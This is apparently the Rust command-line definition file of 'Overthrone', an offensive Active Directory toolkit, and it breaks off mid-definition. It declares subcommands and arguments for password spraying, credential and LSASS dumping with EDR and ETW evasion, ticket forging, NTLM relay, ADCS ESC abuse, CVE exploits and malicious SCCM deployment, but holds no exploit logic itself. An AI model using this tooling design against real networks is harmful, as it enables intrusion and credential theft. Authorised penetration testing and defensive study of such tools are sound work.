mod auth;
mod autopwn;
mod banner;
mod bloodhound_viewer;
mod cli_config;
mod commands;
mod commands_impl;
mod interactive_shell;
mod modules_ext;
mod tree_viewer;
mod tui;

use std::process::ExitCode;

use auth::{AuthMethod, Credentials};
use autopwn::ExecMethod;
use clap::{CommandFactory, Parser, Subcommand};
use clap_complete::{Shell as ClapShell, generate as clap_generate};
use colored::Colorize;
#[cfg(feature = "reaper")]
use overthrone_reaper::runner::ReaperConfig;
use tracing_subscriber::{EnvFilter, fmt};

use futures::StreamExt;
use overthrone_core::c2::C2Manager;
use overthrone_core::exec::modules as ovt_modules;
use overthrone_core::graph::AttackGraph;
use overthrone_core::plugin::{PluginContext, PluginRegistry};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, RwLock};

fn install_rustls_provider() -> Result<(), String> {
    if rustls::crypto::CryptoProvider::get_default().is_some() {
        return Ok(());
    }

    rustls::crypto::ring::default_provider()
        .install_default()
        .map_err(|_| "Failed to install rustls ring crypto provider".to_string())
}

// ──────────────────────────────────────────────────────────
// CLI Definition
// ──────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "overthrone",
    version,
    about = "Active Directory Offensive Toolkit",
    long_about = "Overthrone — AD enumeration, attack path analysis, and exploitation framework.\n\
    Written in Rust for speed and stealth."
)]
struct Cli {
    #[command(subcommand)]
    command: Box<Commands>,

    #[arg(
        short = 'H',
        long,
        global = true,
        env = "OT_DC_HOST",
        alias = "dc",
        alias = "dc-ip"
    )]
    dc_host: Option<String>,

    #[arg(short, long, global = true, env = "OT_DOMAIN")]
    domain: Option<String>,

    #[arg(short, long, global = true, env = "OT_USERNAME")]
    username: Option<String>,

    #[arg(
        short = 'p',
        long,
        global = true,
        env = "OT_PASSWORD",
        hide_env_values = true,
        allow_hyphen_values = true
    )]
    password: Option<String>,

    #[arg(long, global = true, env = "OT_NT_HASH", hide_env_values = true)]
    nt_hash: Option<String>,

    #[arg(long, global = true, env = "KRB5CCNAME")]
    ticket: Option<String>,

    #[arg(
        short = 'A',
        long,
        global = true,
        value_enum,
        default_value_t = AuthMethod::Password
    )]
    auth_method: AuthMethod,

    // Credential list/file options
    #[arg(
        long,
        global = true,
        value_name = "FILE",
        help = "File with usernames (one per line)"
    )]
    user_list: Option<String>,

    #[arg(
        short = 'P',
        long,
        global = true,
        value_name = "FILE",
        help = "File with passwords (one per line)"
    )]
    pass_list: Option<String>,

    #[arg(
        long,
        global = true,
        value_name = "FILE",
        help = "File with user:pass or user:ntlm_hash pairs (one per line)"
    )]
    user_pass_list: Option<String>,

    #[arg(short, long, global = true, action = clap::ArgAction::Count)]
    verbose: u8,

    #[arg(
        long = "output-format",
        global = true,
        value_enum,
        default_value = "text"
    )]
    stdout_format: OutputFormat,

    #[arg(
        long,
        global = true,
        help = "Dry run — validate and show what would be done without executing"
    )]
    dry_run: bool,

    /// Enable structured JSON logging to stdout.
    /// Every critical event (cracked hash, found SPN, etc.) is emitted
    /// as a typed JSON blob suitable for `jq` or pipeline ingestion.
    #[arg(long = "json-log", global = true)]
    json_log: bool,

    #[arg(short = 'O', long, global = true)]
    outfile: Option<String>,

    /// Path to PEM-encoded client certificate for PKINIT-based operations
    #[arg(long, global = true)]
    pkinit_cert: Option<String>,

    /// Path to PEM-encoded private key for PKINIT-based operations
    #[arg(long, global = true)]
    pkinit_key: Option<String>,

    /// Use PKINIT-obtained TGT session key as the encryption key for forging
    /// golden/silver tickets instead of requiring krbtgt hash
    #[arg(long, global = true, default_value = "false")]
    pkinit_keyed_ticket: bool,

    /// Path to TOML config file. Default: search XDG config dirs + CWD.
    #[arg(long, global = true, env = "OT_CONFIG")]
    config: Option<String>,

    /// Named config profile (loaded from `<config_dir>/profiles/<NAME>.toml`).
    /// Profile values override the main config but are overridden by CLI flags.
    /// Also reads from OT_PROFILE env var when this flag is unset.
    #[arg(long, global = true, env = "OT_PROFILE")]
    profile: Option<String>,

    /// List compiled-in feature modules and exit
    #[arg(long)]
    modules: bool,
}

#[derive(Clone, PartialEq, clap::ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

impl std::str::FromStr for OutputFormat {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "text" => Ok(Self::Text),
            "json" => Ok(Self::Json),
            "csv" => Ok(Self::Csv),
            _ => Err(format!(
                "unknown output format: '{}' (expected text|json|csv)",
                s
            )),
        }
    }
}

// ──────────────────────────────────────────────────────────
// Module subcommands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum ModuleAction {
    /// List registered modules (optionally filtered by category)
    List {
        /// Filter by category: Execute, Dump, Enum, Kerberos, Secrets, Scan, Coerce
        #[arg(short, long)]
        category: Option<String>,
    },

    /// Show detailed info for a module
    Info {
        /// Module name
        name: String,
    },

    /// Run a module against a single target
    Run {
        /// Module name
        name: String,
        /// Target host
        #[arg(short, long)]
        target: String,
        /// Optional JSON parameters for the module
        #[arg(long)]
        params: Option<String>,
    },

    /// Run a module against multiple targets in parallel
    RunParallel {
        /// Module name
        name: String,
        /// Comma-separated target hosts
        #[arg(short, long)]
        targets: String,
        /// Optional JSON parameters for the module
        #[arg(long)]
        params: Option<String>,
        /// Max concurrent targets
        #[arg(short = 'c', long, default_value = "10")]
        concurrency: usize,
    },
}

#[derive(Subcommand)]
enum Commands {
    /// Interactive wizard mode for AD engagements
    Wizard {
        #[command(flatten)]
        args: commands::wizard::WizardArgs,
    },

    /// Saved engagement session management (list/show/delete/clean/stats)
    #[command(alias = "sessions")]
    Session {
        #[command(subcommand)]
        action: commands::session::SessionAction,
    },

    /// Manage cached Kerberos tickets (list/show/path/stats/clear)
    #[command(alias = "ccaches", alias = "ccache")]
    Ccach {
        #[command(subcommand)]
        action: commands::ccache::CcacheAction,
    },

    /// Persistent TOML config management (init/show/path/set/unset/edit/save)
    #[command(alias = "cfg")]
    Config {
        #[command(subcommand)]
        action: commands::config::ConfigAction,
    },

    /// Full AD enumeration via reaper modules
    #[cfg(feature = "reaper")]
    Reaper {
        #[arg(long, short, value_delimiter = ',')]
        modules: Vec<String>,
        #[arg(long, default_value = "500")]
        page_size: u32,
    },

    /// Snaffler-style sensitive file discovery across readable SMB shares
    #[cfg(feature = "reaper")]
    Snaffler {
        #[arg(long, default_value = "500")]
        page_size: u32,
    },

    /// Enumerate specific AD object types
    #[cfg(feature = "reaper")]
    Enum {
        #[arg(value_enum)]
        target: EnumTarget,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },

    /// PowerView-style LDAP enumeration aliases backed by Overthrone modules
    #[cfg(feature = "reaper")]
    #[command(alias = "pv", alias = "power-view")]
    Powerview {
        #[command(subcommand)]
        action: PowerViewAction,
    },

    /// Resolve common AD attribute/right GUIDs used in ACEs and ACLs
    Guid {
        #[command(subcommand)]
        action: GuidAction,
    },

    /// Kerberos operations
    #[cfg(feature = "hunter")]
    #[command(alias = "krb", alias = "roast")]
    Kerberos {
        #[command(subcommand)]
        action: KerberosAction,
    },

    /// SMB operations
    Smb {
        #[command(subcommand)]
        action: SmbAction,
    },

    /// Remote command execution
    Exec {
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        command: String,
    },

    /// Attack graph operations
    Graph {
        /// Load graph from JSON file instead of building from LDAP
        #[arg(short, long, global = true)]
        file: Option<String>,
        #[command(subcommand)]
        action: GraphAction,
    },

    /// Password spraying
    #[cfg(feature = "hunter")]
    Spray {
        #[arg(long)]
        password: String,
        /// Optional path to username wordlist (one per line). Omit to use embedded list or --use-ldap.
        #[arg(short = 'U', long, alias = "users")]
        userlist: Option<String>,
        /// When set, attempt LDAP-based username enumeration (anonymous/null-session)
        #[arg(long)]
        use_ldap: bool,
        #[arg(long, default_value = "1")]
        delay: u64,
        #[arg(long, default_value = "0")]
        jitter: u64,
        /// Number of concurrent authentication attempts
        #[arg(long, default_value = "10")]
        concurrency: usize,
    },

    /// Credential dumping (SAM, LSA, NTDS, DCC2)
    Dump {
        #[arg(short, long)]
        target: String,
        #[arg(value_enum)]
        source: DumpSource,
    },

    /// LSASS credential dumping — evasive in-process dump using raw syscalls (EDR/Defender bypass)
    DumpLsass {
        /// Output file path for the minidump (optional: memory-only if omitted)
        #[arg(short, long)]
        output: Option<String>,
        /// Dump method: minidump (comsvcs.dll in-process) or direct (NtReadVirtualMemory page walk)
        #[arg(value_enum, long, default_value = "auto")]
        method: DumpLsassMethod,
        /// LSASS process ID (auto-detected if not specified)
        #[arg(long)]
        pid: Option<u32>,
        /// Skip ETW suppression
        #[arg(long)]
        no_etw_suppress: bool,
    },

    /// Environment diagnostics — check dependencies and connectivity
    #[command(alias = "check", alias = "env")]
    Doctor {
        /// Specific checks to run (smb, kerberos, winrm, network)
        #[arg(long, short, value_delimiter = ',')]
        checks: Vec<String>,
    },

    /// Generate engagement report (Markdown, PDF, JSON)
    #[cfg(feature = "scribe")]
    Report {
        /// Input engagement state file
        #[arg(long, default_value = "engagement.json")]
        input: String,
        /// Output report file
        #[arg(
            id = "report_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "report.md"
        )]
        output: String,
        /// Report format
        #[arg(short = 'F', long, value_enum, default_value = "markdown")]
        format: ReportFormat,
    },

    /// Ticket forging operations (golden, silver tickets)
    #[cfg(feature = "forge")]
    Forge {
        #[command(subcommand)]
        action: ForgeAction,
    },

    /// Crack captured hashes (AS-REP, Kerberoast, NTLM)
    #[cfg(feature = "reaper")]
    Crack {
        /// Hash string to crack (auto-detects type)
        #[arg(short = 's', long)]
        hash: Option<String>,
        /// File containing hashes (one per line)
        #[arg(short, long)]
        file: Option<String>,
        /// Cracking mode (fast, default, thorough)
        #[arg(short = 'M', long, value_enum, default_value = "default")]
        mode: CrackMode,
        /// Custom wordlist file
        #[arg(short = 'W', long)]
        wordlist: Option<String>,
        /// Maximum candidates to try (0 = unlimited)
        #[arg(long, default_value = "0")]
        max_candidates: usize,
        /// Use hashcat GPU subprocess (requires hashcat on PATH)
        #[arg(long)]
        hashcat: bool,
    },

    /// RID cycling — enumerate users/groups via MS-SAMR (works unauthenticated)
    #[command(alias = "rid-cycle", alias = "rid-brute")]
    Rid {
        /// Start RID (default: 500)
        #[arg(long, default_value = "500")]
        start_rid: u32,
        /// End RID (default: 10500)
        #[arg(long, default_value = "10500")]
        end_rid: u32,
        /// Use null session (no credentials)
        #[arg(long, default_value = "false")]
        null_session: bool,
    },

    /// Lateral movement — trust mapping, escalation paths, MSSQL chains
    #[cfg(feature = "reaper")]
    #[command(alias = "lateral")]
    Move {
        #[command(subcommand)]
        action: MoveAction,
        /// Enable LLMNR/NBT-NS/mDNS poisoning with the given response IP
        #[arg(long)]
        poison_ip: Option<String>,
        /// Enable HTTP/SMB/LDAP/MSMQ responder for NTLM credential capture
        #[arg(long, default_value_t = false)]
        respond: bool,
    },

    /// GPP password decryption — decrypt cpassword from Group Policy XML
    Gpp {
        /// Path to local Groups.xml or similar GPP XML file
        #[arg(long)]
        file: Option<String>,
        /// Decrypt a raw cpassword string directly
        #[arg(long)]
        cpassword: Option<String>,
    },

    /// LAPS password reading — read local admin passwords from AD
    #[cfg(feature = "reaper")]
    Laps {
        /// Only query a specific computer name
        #[arg(long)]
        computer: Option<String>,
    },

    /// Shadow Credential lifecycle management — add/list/remove/clear msDS-KeyCredentialLink entries
    #[cfg(feature = "reaper")]
    #[command(alias = "shadowcreds")]
    ShadowCred {
        #[command(subcommand)]
        action: ShadowCredAction,
    },

    /// Domain risk assessment — PingCastle-style health scoring and risk analysis
    #[cfg(feature = "reaper")]
    #[command(alias = "risk")]
    Assess {
        /// Specific modules to run (default: all relevant modules)
        #[arg(long, short, value_delimiter = ',')]
        modules: Vec<String>,
    },

    /// BloodHound attack path analysis — import SharpHound JSON and query attack paths
    #[command(alias = "bh")]
    BloodHound {
        #[command(subcommand)]
        action: BloodHoundAction,
    },

    /// Secrets dumping — offline SAM/LSA/DCC2 from registry hives
    Secrets {
        #[command(subcommand)]
        action: SecretsAction,
    },

    /// NTLM relay and responder — LLMNR/NBT-NS poisoning and credential relay
    #[cfg(feature = "relay")]
    #[command(alias = "relay")]
    Ntlm {
        #[command(subcommand)]
        action: NtlmAction,
    },

    /// ADCS certificate abuse — ESC1-ESC13 attacks
    #[cfg(feature = "forge")]
    #[command(alias = "certify")]
    Adcs {
        #[command(subcommand)]
        action: AdcsAction,
    },

    /// Interactive shell — persistent remote session
    Shell {
        /// Target host
        #[arg(short, long)]
        target: String,
        /// Shell type
        #[arg(short = 'T', long, value_enum, default_value = "winrm")]
        shell_type: ShellType,
    },

    /// SCCM/MECM abuse — client push, app deployment
    #[command(alias = "mecm")]
    Sccm {
        #[command(subcommand)]
        action: SccmAction,
    },

    /// Port scanner & unauthenticated discovery
    #[command(alias = "portscan", alias = "discovery")]
    Scan {
        /// Target hosts (IP, CIDR, or range)
        #[arg(short, long, required = true)]
        targets: String,
        /// Port range (e.g., 80,443 or top1000)
        #[arg(long, default_value = "top1000")]
        ports: String,
        /// Scan type
        #[arg(short = 'T', long, value_enum, default_value = "connect")]
        scan_type: ScanType,
        /// Timeout in milliseconds
        #[arg(long, default_value = "1000")]
        timeout: u64,
        /// Perform LDAP null session check
        #[arg(long, default_value = "true")]
        ldap: bool,
        /// Perform SMB null session check
        #[arg(long, default_value = "true")]
        smb: bool,
        /// Disable LDAP null session checks
        #[arg(long)]
        no_ldap: bool,
        /// Disable SMB null session checks
        #[arg(long)]
        no_smb: bool,
    },

    /// MSSQL operations — query execution, linked servers, xp_cmdshell, audit
    #[command(alias = "sql")]
    Mssql {
        #[command(subcommand)]
        action: MssqlAction,
        /// SOCKS5 proxy address (host:port) for MSSQL connections
        #[arg(long, global = true)]
        proxy: Option<String>,
    },

    /// Launch interactive TUI with live attack graph
    #[cfg(feature = "viewer")]
    #[clap(alias = "ui")]
    Tui {
        /// Domain to crawl
        #[arg(short, long)]
        domain: String,
        /// Start crawler automatically
        #[arg(short = 'c', long, default_value_t = true)]
        crawl: bool,
        /// Load graph from previous JSON export
        #[arg(short = 'l', long)]
        load: Option<String>,
    },

    // ─── NEW: Plugin System ──────────────────────────────────
    /// Plugin management — load, list, execute custom modules
    #[clap(alias = "plug")]
    Plugin {
        #[clap(subcommand)]
        action: PluginAction,
    },

    /// Module management — list and run registered built-in modules
    Module {
        #[command(subcommand)]
        action: ModuleAction,
    },

    // ─── NEW: C2 Integration ─────────────────────────────────
    /// C2 framework integration — Cobalt Strike, Sliver, Havoc
    C2 {
        #[clap(subcommand)]
        action: C2Action,
    },

    // ─── NEW: ACL Abuse ──────────────────────────────────────
    /// ACL/DACL abuse — force-change passwords, add group members, write DACLs
    #[command(alias = "dacl")]
    Acl {
        #[command(subcommand)]
        action: AclAction,
    },

    // ─── NEW: GPO Abuse ──────────────────────────────────────
    /// Group Policy abuse — write ImmediateTask XML to SYSVOL for code execution
    Gpo {
        #[command(subcommand)]
        action: GpoAction,
    },

    // ─── NEW: Azure AD / Entra ID Attacks ────────────────────
    /// Azure AD / Entra ID hybrid identity attacks: SeamlessSSO, Golden SAML, PRT theft
    #[command(alias = "entra", alias = "aad")]
    Azure {
        #[command(subcommand)]
        action: AzureAction,
    },

    // ─── Shell completion generation ────────────────────────
    /// Post-exploitation — check Credential Guard status on target
    Cg {
        /// Target hostname or IP
        #[arg(short, long, required = true)]
        target: String,
    },

    /// Post-exploitation — EDR assessment and evasion
    Edr {
        #[command(subcommand)]
        action: EdrAction,
    },

    /// CVE exploit modules — sAMAccountName spoofing, Shadow Credentials, RBCD
    #[command(alias = "cve")]
    Exploit {
        #[command(subcommand)]
        action: ExploitAction,
    },

    /// Generate shell tab-completion scripts
    #[command(name = "completions", alias = "completion", hide = true)]
    Completions {
        /// Shell to generate completions for
        #[arg(value_enum)]
        shell: CompletionShell,
        /// Write completions to file instead of stdout
        #[arg(
            id = "completions_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT"
        )]
        output: Option<String>,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum CrackMode {
    /// Fast mode - minimal rules, quick cracking
    Fast,
    /// Default mode - balanced rules and speed
    Default,
    /// Thorough mode - all rules, exhaustive search
    Thorough,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ReportFormat {
    Markdown,
    Pdf,
    Json,
    Xlsx,
}

#[derive(Subcommand, Debug, Clone, Copy)]
enum EdrAction {
    /// Assess EDR landscape — detect hooked functions, EDR processes/drivers, ETW, AMSI
    Assess,
    /// Apply stealth profile (unhook NTDLL, abolish ETW, suppress AMSI)
    Evade,
}

// ──────────────────────────────────────────────────────────
// CVE Exploit sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum ExploitAction {
    /// CVE-2021-42278/42287 — sAMAccountName spoofing + KDC confusion (domain admin)
    SamNameSpoof {
        /// DC sAMAccountName to spoof (e.g. DC01$)
        #[arg(long)]
        dc_sam: String,
        /// Password for the temporary computer account
        #[arg(long, default_value = "Exploit123!")]
        password: String,
    },
    /// Shadow Credentials — write msDS-KeyCredentialLink + PKINIT auth
    ShadowCred {
        /// Target DN to attack (e.g. CN=TargetUser,CN=Users,DC=corp,DC=local)
        #[arg(long)]
        target_dn: String,
    },
    /// RBCD — Resource-Based Constrained Delegation
    Rbcd {
        /// Target service DN (e.g. CN=SERVER$,CN=Computers,DC=corp,DC=local)
        #[arg(long)]
        target_dn: String,
        /// Attacker computer sAMAccountName (e.g. ATTACKER$)
        #[arg(long)]
        attacker: String,
        /// Attacker computer password
        #[arg(long, default_value = "Exploit123!")]
        password: String,
    },
    /// Cleanup — remove artifacts from previous exploits
    Cleanup {
        /// Type of artifact to clean
        #[arg(value_enum)]
        artifact: CleanupTarget,
        /// Target DN for cleanup (Shadow Credentials or RBCD)
        #[arg(long)]
        target_dn: Option<String>,
        /// Computer DN for cleanup (sAMName spoof)
        #[arg(long)]
        computer_dn: Option<String>,
    },
}

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum CleanupTarget {
    /// Remove spoofed computer account
    SamNameSpoof,
    /// Remove msDS-KeyCredentialLink
    ShadowCred,
    /// Remove msDS-AllowedToActOnBehalfOfOtherIdentity
    Rbcd,
}

// ──────────────────────────────────────────────────────────
// ADCS sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum AdcsAction {
    /// Enumerate certificate templates and ADCS configuration
    Enum {
        /// Target CA server
        #[arg(short, long)]
        ca: Option<String>,
    },
    /// ESC1 — Web Enrollment with SAN abuse
    Esc1 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short = 'U', long, required = true)]
        target_user: String,
        #[arg(
            id = "adcs_esc1_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc1_cert.pfx"
        )]
        output: String,
    },
    /// ESC2 — Web Enrollment with any template
    Esc2 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(
            id = "adcs_esc2_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc2_cert.pfx"
        )]
        output: String,
    },
    /// ESC3 — Enrollment Agent abuse
    Esc3 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        agent_template: String,
        #[arg(short, long, required = true)]
        target_template: String,
        #[arg(short = 'U', long, required = true)]
        target_user: String,
    },
    /// ESC4 — Vulnerable certificate template ACLs
    Esc4 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
    },
    /// ESC5 — Vulnerable CA configuration
    Esc5 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
    Esc6 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC7 — Vulnerable CA permissions
    Esc7 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC8 — ADCS Web Enrollment relay
    Esc8 {
        #[arg(short = 'w', long, required = true)]
        url: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning)
    Esc9 {
        /// CA web enrollment server (e.g. `<http://ca.corp.local>`)
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template name (must have CT_FLAG_NO_SECURITY_EXTENSION)
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate (e.g. Administrator@corp.local)
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// Victim account whose UPN will be temporarily modified
        #[arg(short = 'V', long, required = true)]
        victim: String,
        /// Original UPN of the victim account (for restoration)
        #[arg(short = 'R', long, required = true)]
        original_upn: String,
        /// LDAP URL (for UPN modification commands, e.g. ldap://dc01.corp.local)
        #[arg(short, long, default_value = "ldap://dc01.corp.local")]
        ldap_url: String,
        /// LIVE DC IP/hostname — when provided with ldap-user/ldap-pass/ldap-domain/victim-dn
        /// enables fully automated UPN poisoning via exploit_with_ldap()
        #[arg(long = "target-dc")]
        target_dc: Option<String>,
        /// LIVE LDAP bind username for live UPN modification
        #[arg(long)]
        ldap_user: Option<String>,
        /// LIVE LDAP bind password for live UPN modification
        #[arg(long)]
        ldap_pass: Option<String>,
        /// LIVE LDAP domain (e.g. corp.local)
        #[arg(long)]
        ldap_domain: Option<String>,
        /// LIVE Full distinguished name of the victim account (e.g. CN=alice,CN=Users,DC=corp,DC=local)
        #[arg(long)]
        victim_dn: Option<String>,
        /// LIVE Use LDAPS (port 636) for the live LDAP modification
        #[arg(long)]
        ldaps: bool,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc9_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc9_cert.pfx"
        )]
        output: String,
    },
    /// ESC10 — Weak Certificate Mapping (StrongCertificateBindingEnforcement / CertificateMappingMethods)
    Esc10 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template to enroll in
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// ESC10 variant: 'a' (StrongCertificateBindingEnforcement=0) or 'b' (CertificateMappingMethods UPN bit)
        #[arg(short = 'V', long, default_value = "a")]
        variant: String,
        /// [Variant B / LIVE] Victim account name whose UPN is temporarily overwritten
        #[arg(long)]
        victim: Option<String>,
        /// [Variant B / LIVE] Full distinguished name of the victim account
        #[arg(long)]
        victim_dn: Option<String>,
        /// [Variant B / LIVE] Victim's original UPN (restored after cert is issued)
        #[arg(long)]
        original_upn: Option<String>,
        /// [Variant B / LIVE] DC IP/hostname for LDAP
        #[arg(long = "target-dc")]
        target_dc: Option<String>,
        /// [Variant B / LIVE] LDAP bind username
        #[arg(long)]
        ldap_user: Option<String>,
        /// [Variant B / LIVE] LDAP bind password
        #[arg(long)]
        ldap_pass: Option<String>,
        /// [Variant B / LIVE] LDAP domain
        #[arg(long)]
        ldap_domain: Option<String>,
        /// [Variant B / LIVE] Use LDAPS (port 636)
        #[arg(long)]
        ldaps: bool,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc10_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc10_cert.pfx"
        )]
        output: String,
    },
    /// ESC11 — Relay NTLM to ICPR (ICertPassage; IF_ENFORCEENCRYPTICERTREQUEST disabled)
    Esc11 {
        /// CA hostname or IP address
        #[arg(short, long, required = true)]
        ca_host: String,
        /// CA common name (e.g. corp-CA01)
        #[arg(short = 'N', long, required = true)]
        ca_name: String,
        /// Certificate template to request for the relayed identity
        #[arg(short, long, required = true)]
        template: String,
        /// LIVE SMB username — when provided with smb-pass and smb-domain enables live
        /// InterfaceFlags registry read via assess_with_smb() instead of guidance-only
        #[arg(long)]
        smb_user: Option<String>,
        /// LIVE SMB password for live registry read
        #[arg(long)]
        smb_pass: Option<String>,
        /// LIVE SMB domain for live registry read
        #[arg(long)]
        smb_domain: Option<String>,
    },
    /// ESC12 — CA private key exfiltration via shell access to the CA server
    Esc12 {
        /// CA server hostname or IP
        #[arg(short, long, required = true)]
        ca_host: String,
        /// CA common name (e.g. corp-CA01)
        #[arg(short = 'N', long, required = true)]
        ca_name: String,
        /// Privileged account on the CA server
        #[arg(short = 'U', long, default_value = "Administrator")]
        operator: String,
        /// Path on the CA server to write the backup
        #[arg(short, long, default_value = r"C:\Windows\Temp\cabackup")]
        backup_path: String,
    },
    /// ESC13 — Issuance Policy OID linked to privileged group (msDS-OIDToGroupLink)
    Esc13 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template containing the linked issuance policy OID
        #[arg(short, long, required = true)]
        template: String,
        /// The issuance policy OID value linked to a privileged group
        #[arg(long = "policy-oid", required = true)]
        policy_oid: String,
        /// DN of the privileged group linked to the OID
        #[arg(short = 'G', long, required = true)]
        linked_group_dn: String,
        /// Subject CN for the certificate request
        #[arg(short, long, default_value = "overthrone-esc13")]
        subject: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc13_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc13_cert.pfx"
        )]
        output: String,
    },
    /// ESC14 — Certificate mapping / altSecurityIdentities guidance
    Esc14 {
        /// Target account DN (e.g. CN=Administrator,CN=Users,DC=corp,DC=local)
        #[arg(short = 'T', long, required = true)]
        target_dn: String,
        /// Target account sAMAccountName
        #[arg(short = 'S', long, required = true)]
        target_sam: String,
        /// Certificate mapping value to write (e.g. `X509:<RFC822>admin@corp.local`)
        #[arg(short = 'M', long, required = true)]
        mapping: String,
        /// DC IP/hostname for LDAP modification
        #[arg(short, long)]
        dc: Option<String>,
        /// LIVE Perform live LDAP modification (requires ldap-user/ldap-pass)
        #[arg(long)]
        live: bool,
    },
    /// ESC15 — Schema V1 template with enrollee-supplied subject (EKUwu)
    Esc15 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Schema V1 template name
        #[arg(short, long, required = true)]
        template: String,
        /// Target user to impersonate via SAN
        #[arg(short = 'U', long, required = true)]
        target_user: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc15_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc15_cert.pfx"
        )]
        output: String,
    },
    /// ESC16 — CA security extension disabled path
    Esc16 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Template name (with NO_SECURITY_EXTENSION flag)
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// Victim account whose UPN will be poisoned
        #[arg(short = 'V', long, required = true)]
        victim: String,
        /// Original UPN of the victim (for cleanup)
        #[arg(short = 'R', long, required = true)]
        original_upn: String,
        /// LDAP URL (e.g. ldap://dc01.corp.local)
        #[arg(short, long, default_value = "ldap://dc01.corp.local")]
        ldap_url: String,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc16_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc16_cert.pfx"
        )]
        output: String,
    },
    /// Request a certificate
    Request {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short, long)]
        subject: Option<String>,
        #[arg(short = 'S', long)]
        san: Option<String>,
        #[arg(
            id = "adcs_request_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "cert.pfx"
        )]
        output: String,
    },
    /// Auto-scan and optionally exploit — enumerate all ESCs, find viable targets, auto-exploit
    Auto {
        /// CA server hostname (optional — auto-discovered from LDAP)
        #[arg(short, long)]
        ca: Option<String>,
        /// Target template filter (optional — scan specific template)
        #[arg(short, long)]
        template: Option<String>,
        /// Target user UPN for auto-exploit
        #[arg(short = 'U', long)]
        target_user: Option<String>,
        /// Automatically exploit the most severe finding
        #[arg(long)]
        exploit: bool,
    },
}

// ──────────────────────────────────────────────────────────
// SCCM sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum SccmAction {
    /// Enumerate SCCM/MECM configuration
    Enum {
        /// SCCM site server
        #[arg(short, long)]
        site_server: Option<String>,
    },
    /// Abuse SCCM for lateral movement
    Abuse {
        /// Target site server
        #[arg(short, long, required = true)]
        site_server: String,
        /// Abuse technique
        #[arg(short, long, value_enum, default_value = "client-push")]
        technique: SccmTechnique,
    },
    /// Deploy malicious application
    Deploy {
        /// Target collection
        #[arg(short, long, required = true)]
        collection: String,
        /// Application name
        #[arg(short, long, required = true)]
        app_name: String,
        /// Payload path
        #[arg(long, required = true)]
        payload: String,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum SccmTechnique {
    /// Client push installation abuse
    ClientPush,
    /// Application deployment abuse
    AppDeploy,
    /// Task sequence abuse
    TaskSequence,
    /// Collection modification
    CollectionMod,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ShellType {
    /// WinRM-based shell
    Winrm,
    /// SMB-based shell (PsExec style)
    Smb,
    /// WMI-based shell
    Wmi,
    /// Null session shell (no credentials, falls back to SMB)
    Null,
    /// Guest session shell (falls back to SMB)
    Guest,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ScanType {
    /// SYN scan (requires raw sockets/root)
    Syn,
    /// TCP connect scan
    Connect,
    /// ACK scan (firewall mapping)
    Ack,
}

// ──────────────────────────────────────────────────────────
// MSSQL sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum MssqlAction {
